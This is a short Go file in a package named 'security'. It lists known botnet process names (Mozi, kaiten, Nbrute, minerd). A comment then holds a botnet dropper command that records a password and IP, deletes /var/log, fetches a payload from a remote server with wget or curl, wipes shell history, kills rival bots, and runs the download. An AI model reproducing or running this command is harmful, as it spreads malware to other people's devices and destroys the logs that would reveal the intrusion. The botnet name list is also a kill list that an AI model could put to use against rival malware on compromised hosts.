package security

var (
	EvilProcess = []string{
		// Known botnet binary names
		"i", ".i", "mozi.m", "Mozi.m", "mozi.a", "Mozi.a", "kaiten", "Nbrute", "minerd",
	}
)

// touch /var/tmp/" + fileName(false) + "; printf \"" + b.password + "\\n" + b.tempIP + " [" + arch + "]" + "\\n\" > /var/tmp/" + fileName(false) + "; rm -rf /var/log/; wget -O " + fileName(false) + " " + *server + " || curl -o " + fileName(false) + " " + *server + "; history -c; rm ~/.bash_history; killall i .i mozi.m Mozi.m mozi.a Mozi.a kaiten Nbrute minerd /bin/busybox; chmod 700 " + fileName(false) + "; ./" + fileName(false) + " &
